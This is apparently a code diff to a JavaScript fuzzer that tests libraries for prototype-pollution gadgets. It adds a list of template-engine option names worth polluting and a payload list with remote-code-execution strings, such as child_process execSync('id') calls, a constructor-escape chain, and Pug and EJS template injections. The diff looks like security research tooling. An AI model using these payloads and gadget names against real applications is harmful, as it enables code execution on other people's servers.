@@ -45,6 +45,14 @@ export class InputGeneration {
       // Alpha/beta parameters for Beta distribution (Bayesian bandit)
       this.strategyStats.set(s, { successes: 1, failures: 1, totalMutations: 0 });
     }
+
+    // UOP property discovery: properties the target reads as undefined
+    // Fed back from the differential oracle's discoverUOPProperties
+    this.discoveredUOPProperties = new Set();
+    // Track which property+payload combos have been confirmed as gadgets
+    this.confirmedGadgets = new Map();
+    // Track property effectiveness for Thompson sampling
+    this.propertyStats = new Map();
   }
 
   async generateInputs(config, iteration) {
@@ -699,6 +707,162 @@ export class InputGeneration {
   }
 
   /**
+   * Generate pollution descriptors for differential testing.
+   *
+   * A pollution descriptor is { property, value } — the property to set on
+   * Object.prototype and the payload value. These are used by the differential
+   * oracle to test whether polluting this property changes library behavior.
+   *
+   * Sources of property names (in priority order):
+   * 1. Discovered UOP properties (from taint log analysis)
+   * 2. Config-defined pollutionPoints
+   * 3. Generic high-value properties
+   *
+   * @param {object} config - Target configuration
+   * @param {number} count - Number of descriptors to generate
+   * @returns {Array<{property: string, value: any}>}
+   */
+  generatePollutionDescriptors(config, count = 10) {
+    const descriptors = [];
+    const properties = this.getPollutionProperties(config);
+    const payloads = this.getPayloads();
+
+    for (let i = 0; i < count; i++) {
+      // Select property: prefer discovered UOP properties (they're real)
+      const property = properties[i % properties.length];
+
+      // Select payload: cycle through different types
+      const payload = payloads[i % payloads.length];
+
+      descriptors.push({ property, value: payload.value, payloadType: payload.type });
+    }
+
+    return descriptors;
+  }
+
+  /**
+   * Get prioritized list of properties to try polluting.
+   */
+  getPollutionProperties(config) {
+    const properties = [];
+
+    // Highest priority: UOP properties discovered from actual execution
+    for (const prop of this.discoveredUOPProperties) {
+      properties.push(prop);
+    }
+
+    // Medium priority: config-defined pollution points
+    for (const prop of (config.pollutionPoints || [])) {
+      if (!properties.includes(prop)) {
+        properties.push(prop);
+      }
+    }
+
+    // Low priority: generic high-value targets for template engines
+    const generic = [
+      'block', 'debug', 'compileDebug', 'self', 'line', 'pretty', 'filename',
+      'basedir', 'doctype', 'globals', 'filters', 'plugins', 'cache',
+      'template', 'autoEscape', 'defaultFilter', 'tags', 'rmWhitespace',
+      'e', 'async', 'root', 'views', 'partials', 'helpers', 'layout',
+      'outputFunctionName', 'localsName', 'destructuredLocals', 'escape'
+    ];
+    for (const prop of generic) {
+      if (!properties.includes(prop)) {
+        properties.push(prop);
+      }
+    }
+
+    return properties;
+  }
+
+  /**
+   * Get payload values designed to trigger different sink types.
+   *
+   * Payloads are crafted to:
+   * 1. Reach code execution sinks (eval, Function, exec)
+   * 2. Be detectable in output (sentinel values)
+   * 3. Trigger type coercion edge cases
+   * 4. Match patterns template engines actually consume
+   */
+  getPayloads() {
+    return [
+      // Sentinel value — detectable in output without being dangerous
+      { type: 'sentinel', value: '__UOPFUZZ_MARKER_7f3a__' },
+
+      // Code execution payloads for template engines (compile-time injection)
+      { type: 'rce_function', value: 'x]});process.mainModule.require("child_process").execSync("id");//' },
+      { type: 'rce_require', value: "require('child_process').execSync('id')" },
+      { type: 'rce_constructor', value: 'constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")' },
+
+      // Boolean/truthy — many gadgets check if (options.debug) etc
+      { type: 'boolean_true', value: true },
+      { type: 'boolean_string', value: '1' },
+
+      // Template injection payloads
+      { type: 'template_pug', value: '-var x = process.mainModule.require("child_process").execSync("id")' },
+      { type: 'template_ejs', value: '<%= process.mainModule.require("child_process").execSync("id") %>' },
+
+      // Object with toString — triggers type coercion
+      { type: 'coercion_tostring', value: { toString: () => '__UOPFUZZ_COERCED__' } },
+
+      // Function payload — if the library calls the polluted value
+      { type: 'function', value: function() { return '__UOPFUZZ_CALLED__'; } },
+
+      // Numeric payloads
+      { type: 'number', value: 1337 },
+      { type: 'zero', value: 0 },
+
+      // Null/undefined boundary
+      { type: 'empty_string', value: '' },
+      { type: 'null', value: null },
+    ];
+  }
+
+  /**
+   * Feed discovered UOP properties back from the differential oracle.
+   * These are properties the library actually reads as undefined,
+   * making them prime candidates for prototype pollution.
+   */
+  integrateUOPDiscovery(properties) {
+    let newCount = 0;
+    for (const prop of properties) {
+      if (!this.discoveredUOPProperties.has(prop)) {
+        this.discoveredUOPProperties.add(prop);
+        newCount++;
+        // Initialize property stats for Thompson sampling
+        if (!this.propertyStats.has(prop)) {
+          this.propertyStats.set(prop, { successes: 1, failures: 1 });
+        }
+      }
+    }
+    return newCount;
+  }
+
+  /**
+   * Update property effectiveness after differential oracle result.
+   */
+  updatePropertyFeedback(property, wasEffective) {
+    const stats = this.propertyStats.get(property);
+    if (stats) {
+      if (wasEffective) {
+        stats.successes++;
+      } else {
+        stats.failures++;
+      }
+    }
+  }
+
+  /**
+   * Record a confirmed gadget for reporting and deduplication.
+   */
+  recordConfirmedGadget(property, payload) {
+    const key = `${property}:${typeof payload}`;
+    if (!this.confirmedGadgets.has(key)) {
+      this.confirmedGadgets.set(key, { property, payload, confirmedAt: Date.now() });
+    }
+  }
+
+  /**
    * Calculate Shannon entropy of the current seed corpus.
    * Measures diversity of mutation strategies in the corpus.
    *
@@ -738,7 +902,9 @@ export class InputGeneration {
       strategies: this.mutationStrategies.length,
       seedCount: this.seedCorpus.length,
       corpusEntropy: this.getCorpusEntropy(),
-      strategyEffectiveness
+      strategyEffectiveness,
+      discoveredUOPProperties: [...this.discoveredUOPProperties],
+      confirmedGadgets: [...this.confirmedGadgets.values()]
     };
   }
 }
